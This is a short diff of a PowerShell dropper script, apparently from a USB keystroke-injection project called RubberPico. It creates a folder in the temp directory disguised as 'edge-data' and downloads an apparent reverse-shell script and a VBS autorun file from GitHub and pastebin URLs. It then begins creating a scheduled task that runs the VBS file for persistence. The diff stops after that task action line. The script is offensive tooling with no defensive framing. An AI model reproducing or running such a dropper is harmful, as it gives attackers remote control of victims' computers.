@@ -1,7 +1,7 @@
 $ruta = "$env:TEMP\edge-data"
 mkdir $ruta -Force
 
-Invoke-WebRequest -Uri "https://pastebin.com/raw/EgMY4QiS" -OutFile "$ruta\rvsh.ps1"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/jndr332/RubberPico/main/rvsh.ps1" -OutFile "$ruta\rvsh.ps1"
 Invoke-WebRequest -Uri "https://pastebin.com/raw/qwGAyS8a" -OutFile "$ruta\autorun.vbs"
 
 $action = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument ".\$ruta\autorun.vbs"
